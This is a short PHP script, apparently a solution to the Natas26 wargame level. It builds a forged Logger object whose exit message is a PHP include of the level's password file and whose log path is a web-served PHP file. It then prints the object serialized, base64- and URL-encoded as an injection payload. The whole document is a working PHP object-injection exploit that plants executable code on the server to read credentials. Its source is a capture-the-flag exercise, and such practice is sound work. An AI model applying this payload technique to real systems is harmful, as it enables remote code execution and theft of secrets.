<?php
    
    error_reporting(0);

    # Copy-pasted from the Natas26 Source-code
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="No input needed here";
            $this->exitMsg="<?php include('/etc/natas_webpass/natas27')?>";
            $this->logFile = "img/get_rekt.php";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }
    }

    $object = new Logger("Get_rekt");
    echo urlencode(base64_encode(serialize($object)));
?>